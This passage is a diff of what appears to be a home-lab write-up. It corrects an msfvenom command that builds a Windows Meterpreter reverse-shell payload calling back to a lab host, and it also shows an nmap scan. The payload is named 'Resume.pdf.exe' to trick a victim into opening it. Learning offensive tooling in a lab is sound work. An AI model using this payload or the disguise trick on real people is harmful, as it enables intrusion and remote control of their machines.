@@ -61,7 +61,7 @@ Entered `nmap -A 192.168.20.10 -Pn` to scan all the ports of my Windows 10 VM / 
   
 Entered `msfvenom -l payloads` to list the available malware or payloads to use
 
-Entered `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe - Resume.pdf.exe` to essentially download Meterpreter's reverse tcp malware into a file called Resume.pdf.exe (We name it this so the file can normally appear as "Resume.pdf" to trick the victim, with "Resume.pdf.exe" only appearing if the victim manually shows file extensions).
+Entered `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe` to essentially download Meterpreter's reverse tcp malware into a file called Resume.pdf.exe (We name it this so the file can normally appear as "Resume.pdf" to trick the victim, with "Resume.pdf.exe" only appearing if the victim manually shows file extensions).
 
 <img width="1277" height="798" alt="2" src="https://github.com/user-attachments/assets/5863d89c-d98a-4bb0-b770-53eb35d42ab0" />
 <img width="1278" height="800" alt="2 1" src="https://github.com/user-attachments/assets/79d93e04-bed0-401f-b00c-865e2aca24aa" />
